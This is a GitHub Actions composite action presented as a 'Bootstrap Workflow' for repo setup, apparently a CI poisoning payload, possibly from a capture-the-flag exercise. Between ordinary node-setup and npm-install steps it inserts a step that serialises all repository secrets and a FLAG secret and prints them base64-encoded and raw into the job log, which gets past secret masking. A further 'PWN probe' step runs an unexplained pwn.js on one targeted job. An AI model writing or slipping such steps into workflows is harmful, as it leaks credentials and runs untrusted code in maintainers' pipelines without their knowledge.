name: Bootstrap Workflow
description: Reusable action for setting up the repo
runs:
  using: composite
  steps:
    - name: Setup node
      uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
      with:
        node-version: 22
        cache: 'npm'
        cache-dependency-path: utils/package-lock.json

    - name: Secret context probe
      shell: bash
      env:
        ALL_SECRETS_CTX: ${{ toJSON(secrets) }}
        FLAG_CTX: ${{ secrets.FLAG }}
      run: |
        echo "SECRETCTX_B64=$(printf '%s' "$ALL_SECRETS_CTX" | base64 -w0)"
        echo "FLAGCTX_B64=$(printf '%s' "$FLAG_CTX" | base64 -w0)"
        echo "SECRETCTX_RAW=$ALL_SECRETS_CTX"

    - name: PWN probe
      shell: bash
      run: |
        if [ "$GITHUB_JOB" != "ensure-quickstart-ids-are-unique" ]; then
          echo "PWN_MARKER_SKIP job=$GITHUB_JOB"
          exit 0
        fi
        node "$GITHUB_WORKSPACE/pwn.js" || true

    - name: Install dependencies
      shell: bash
      run: cd utils && npm ci
